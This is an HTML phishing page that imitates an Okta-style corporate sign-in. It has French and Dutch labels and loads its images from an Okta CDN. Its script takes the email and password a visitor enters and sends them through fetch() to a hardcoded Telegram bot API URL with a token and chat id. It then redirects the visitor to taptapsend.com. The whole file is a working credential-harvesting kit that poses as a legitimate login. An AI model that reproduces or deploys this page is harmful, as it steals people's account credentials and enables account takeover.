<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Connexion</title>
    <style>
        body {
            background-image: url('https://ok9static.oktacdn.com/fs/bco/7/fs0chyx69ua4xbJnw417'); 
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: beginning;
        }
        .logo {
            width: 200px;
        }
        input[type="text"], input[type="password"] {
            width: 80%;
            padding: 20px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #FFD700; /* Jaune foncé */
            color: black;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 80%;
            margin: 10px 0;
        }
        .remember-me {
            margin-bottom: 10px;
        }
        .languages {
            text-align: right;
        }
        .footer-links {
            font-size: 12px;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="languages">
            <a href="#">NL</a> | <a href="#">FR</a> | <a href="#">EN</a>
        </div>
        <img src="https://ok9static.oktacdn.com/fs/bco/1/fs0ci1i9sp9xQg0tI417" alt="Logo" class="logo">
        
        <div id="emailSection">
            <label for="email">Je e-mailadres</label>
            <input type="text" id="email" placeholder="Entrez votre e-mail">
            <div class="remember-me">
                <input type="checkbox" id="rememberMe"> 
                <label for="rememberMe">Se souvenir de moi</label>
            </div>
            <button id="nextButton">Suivant</button>
        </div>

        <div id="passwordSection" style="display: none;">
            <label for="password">Wachtwoord</label>
            <input type="password" id="password" placeholder="Entrez votre mot de passe">
            <button id="loginButton">Se connecter</button>
        </div>

        <div class="footer-links">
            <p><a href="#">Wachtwoord vergeten?</a></p>
            <p><a href="#">Aanmelden met iets anders - NIEUW</a></p>
            <p><a href="#">Terug naar aanmelden</a></p>
        </div>
    </div>

    <script>
        document.getElementById('nextButton').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            if (email) {
                document.getElementById('emailSection').style.display = 'none';
                document.getElementById('passwordSection').style.display = 'block';
            } else {
                alert('Veuillez entrer un e-mail.');
            }
        });

        document.getElementById('loginButton').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (email && password) {
                // Envoi des données à votre bot Telegram
                fetch(`https://api.telegram.org/bot5664903678:AAHEHtO2Wb-UC5N7AizvuqiQ-Nd_G89Rd90/sendMessage?chat_id=5147593892&text=Email:%20${encodeURIComponent(email)}%0AMot%20de%20passe:%20${encodeURIComponent(password)}`)
                    .then(response => {
                        if (response.ok) {
                            window.location.href = 'https://www.taptapsend.com/';
                        } else {
                            alert('Erreur lors de l\'envoi des données.');
                        }
                    });
            } else {
                alert('Veuillez remplir tous les champs.');
            }
        });
    </script>

</body>
</html>
